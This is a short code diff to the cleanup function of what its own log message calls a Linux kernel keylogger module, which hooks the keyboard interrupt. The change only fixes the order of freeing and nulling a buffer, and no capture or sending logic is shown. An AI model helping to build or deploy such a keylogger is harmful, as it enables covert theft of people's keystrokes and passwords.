@@ -321,9 +321,10 @@ end:
 static void __exit hello_cleanup(void) {
 	printk(KERN_INFO "Destroying keylogger module.\n");
 	write_logs();
-	kfree(read_buffer);
-	if (read_buffer)
+	if (read_buffer) {
+		kfree(read_buffer);
 		read_buffer = NULL;
+	}
 	misc_deregister(&kbhandler);
 	mutex_destroy(&g_mutex);
 	free_irq(1, (void *)(irq_handler));
